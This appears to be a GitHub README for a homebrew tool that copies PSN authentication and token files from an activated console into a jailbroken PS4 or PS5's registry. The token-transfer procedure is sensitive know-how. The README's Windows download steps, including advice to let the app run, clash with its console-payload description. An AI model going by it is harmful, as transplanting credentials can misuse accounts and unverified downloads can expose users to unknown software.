# 🛠️ np-account-restore - Restore PSN account data safely

[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/joseh3951/np-account-restore/releases)

## 📥 Download

Visit this page to download the release files:

https://github.com/joseh3951/np-account-restore/releases

Download the latest release package for Windows, then extract it to a folder you can find again

## 🧰 What this tool does

np-account-restore restores PSN account files on a jailbroken PS4 or PS5.

It uses real account files from a console that is already signed in and activated for PSN. The tool writes that account setup into the target console system registry.

Use it only when you need to restore an account profile on a console you control.

## ⚙️ What you need

Before you start, make sure you have:

- A Windows PC
- A console that is signed in to PSN and activated
- A jailbroken target PS4 or PS5
- A way to send an ELF payload to the target console
- Access to the account files on the source console
- A USB drive or file transfer method to move files to the target console

## 🪜 Step 1: Get the files

On the console that is signed in to PSN, find and copy these files:

```text
/system_data/priv/home/<userid>/config.dat
/system_data/priv/home/<userid>/np/auth.dat
```

For PS4, also copy these files:

```text
/user/home/<userid>/np/account.dat
/user/home/<userid>/np/token.dat
```

`<userid>` is the hex user ID for the signed-in account.

Keep the files in a safe folder on your Windows PC so you can copy them to the target console

## 📁 Step 2: Copy the files to the target console

Copy the files you saved on your PC to the target console in a place you can reach with the payload tool or file browser.

Use the same file names as shown above.

If you are using a USB drive, make sure the files stay in a simple folder with no extra renaming

## 🔌 Step 3: Send the payload

Use your payload sender to send the np-account-restore ELF to the jailbroken target console.

Common options include:

- netcat
- a payload sender app
- another ELF sender tool you already use

Wait for the payload to finish before you move on

## 🖥️ Step 4: Run the restore process

When the payload starts, it reads the account files and writes the account setup to the system registry on the target console.

Follow the on-screen prompts if the build you use shows any.

Do not turn off the console while the restore runs

## ✅ Step 5: Check the result

After the payload finishes, check that the account appears on the target console.

Look for:

- The PSN sign-in state
- The restored account name
- The correct user profile
- Access to the expected account data

If the account does not show up, check the file names and try the process again

## 🪟 Windows setup

On Windows, you only need a few steps to prepare the release files:

1. Open the release page
2. Download the latest package
3. Right-click the file and choose Extract All
4. Open the extracted folder
5. Keep the payload file and support files in the same folder

If Windows asks for permission, allow the app to run

## 📦 Files in the release

A typical release package includes:

- The main ELF payload
- A short readme file
- Build notes
- Support files for transfer or testing

If you do not see the exact file name you expect, use the newest release asset listed on the release page

## 🧭 How to use the files

The restore tool depends on the source console files being correct.

Use one set of files per account

Keep these rules in mind:

- Do not mix files from different users
- Do not rename the files
- Do not edit the file contents
- Do not copy extra files into the same restore folder

## 🔍 Troubleshooting

If the payload does not work, check these items:

- The target console is jailbroken
- The file paths match the source console
- You copied the right `<userid>` folder
- The PS4-only files are present when needed
- The payload sender reached the console
- The release file finished downloading

If the account still does not restore, repeat the file copy step and try again with a fresh set of files

## 🧼 Good practices

To reduce the chance of problems:

- Use a console you can afford to reinitialize if needed
- Keep a copy of the original files before you start
- Work with one account at a time
- Use a clean folder for each restore attempt
- Verify the file names before sending the payload

## 🔗 Download again

If you need the release files again, use this page:

https://github.com/joseh3951/np-account-restore/releases